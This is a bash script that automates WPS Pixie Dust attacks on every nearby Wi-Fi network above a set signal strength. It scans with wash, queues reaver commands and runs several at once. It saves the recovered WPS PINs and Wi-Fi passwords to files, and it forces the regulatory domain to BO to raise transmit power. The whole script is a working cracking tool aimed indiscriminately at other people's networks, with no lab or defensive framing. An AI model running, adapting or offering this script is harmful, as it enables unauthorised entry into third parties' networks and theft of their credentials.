#!/bin/bash
# Dependent files: blacklist.txt, recovered.txt, pins.txt, attackargs.dusty

###Hardware selection
ignore=wlan0 # dont use this interface. the rpi 3 built-in interface isn't capable of monitor
attackinterface=0 #used to reference 0 based array of monitor interfaces
scaninterface=1 #0 is the first occurring interface in ifconfig output

###Attack configurations - fine tuning
ScanInterval=65 #Restart wash at a set interval to update rssi values
SignalStrength=-75 #Value of rssi (negative values, lower is stronger
PixieTimeout=14 #Default lifespan of a subprocess in seconds
MaxSubprocesses=4 #The number of concurrent attacks to run


NICS="$(ifconfig | grep w | cut -d ' ' -f 1 | cut -d ':' -f 1 | grep -v $ignore)"
if [ -z "$NICS" ]
then
	echo " [!] ERROR: No valid interfaces"
	exit
fi
#Kills processes that could cause problems - !this will kill any existing wifi connections
#(airmon-ng check kill)
sleep 2
#Enable mon on wireless interfaces
MONS=()
for CARD in $NICS
do
#	echo $CARD #debug
	ifconfig $CARD down
	iw reg set BO
	ifconfig $CARD up
	iwconfig $CARD txpower 30 2> /dev/null
	MON=$(airmon-ng start $CARD |grep "enable" | cut -d ']' -f 3 | cut -d ')' -f1)
	echo " [*] Started $CARD on $MON"
	ifconfig $MON down
	iwconfig $CARD txpower 30 2> /dev/null
	#macchanger -r
	ifconfig $MON up
	#echo " [*] Increased power output to $CARD"
	if [ $(ifconfig $MON) -z ] 2> /dev/null
	then
		echo "[!] ERROR: $CARD could not be started"
		exit
	fi
	MONS+=($MON)
done
trap ./stop.sh EXIT
#Check if more than 1 interface is up - My current setup utilises two wireless cards
if  [ ! ${#MONS[@]} -gt 1 ]
then
	exit
fi

if [ -f target.txt ]
then
	rm target.txt
fi
: > target.txt

Scanner=${MONS[$scaninterface]}
Attacker=${MONS[$attackinterface]}

##Scanner subprocess - Scans for WPS networks using reaver's -wash-
(while :; do wash -i $Scanner -P --ignore-fcs 1>> target.txt & sleep $ScanInterval; (killall wash 2> /dev/null); done  2> /dev/null &)
echo " [*] Started WPS sniffer using $Scanner interface"
echo " [*] Attacking networks with rssi stronger than $SignalStrength"
echo " [*] Attack timeout is $PixieTimeout s"

##Factory subprocess - Prepares attack commands for the consumer
echo " [*] Started factory subprocess"
(tail -f target.txt 2> /dev/null | while read a;
	do
		rssi=$(echo $a | cut -d '|' -f 3);
		if [ $rssi -le $SignalStrength ];then continue;fi;
		bssid=$(echo $a |cut -d '|' -f 1);
		if [[ $(cat blacklist.txt 2>/dev/null) == *"$bssid"* ]];then continue;fi;
		channel=$(echo $a | cut -d '|' -f 2);
		essid=$(echo $a | cut -d '|' -f 6);
		echo " [+] Detected network $essid ($rssi)";
		#This line below is gonna be annoying to debug
		echo "result=\$(timeout $PixieTimeout yes n \| reaver -i $Attacker -b $bssid -c $channel -vvv -K 1 2> /dev/null); if [[ \$result == *Test* ]];then echo \" [+] Password recovered for $essid\";echo \"$bssid\|$essid\" >> blacklist.txt;echo \"-------\" >> recovered.txt;for i in \$(seq 13 16);do echo \$result \| cut -d \"+\" -f \$i |grep \"PIN\|PSK\|SSID\" \|cut -d \"[\" -f1 \|cut -d \"]\" -f2 >> recovered.txt;done elif [[ \$result == *Cmd* ]];then echo \" [+] Pin cracked for $essid  - password recovery timed out\"; echo \"$bssid|$essid\" >> blacklist.txt; echo \$result | grep \"Cmd\" >> pins.txt; elif [[ \$result == *found!* ]];then echo \" [-] $essid is not vulnerable = added to blacklist to ignore\"; echo \"$bssid|$essid|Not Vulnerable\" >> blacklist.txt; fi" >> attackargs.dusty

	done &)


##Consumer subprocess - Runs the attack commands
rm attackargs.dusty
: > attackargs.dusty
#echo "Consumer started *nom"
(tail -f attackargs.dusty 2> /dev/null | while read a;
	do
	echo $a >> debug.txt
	#escape the command then run it
	x=$(printf "%q\n" "$a" | xargs --max-procs=$MaxSubprocesses -I CMD bash -c CMD)
	echo "$x"
	done )
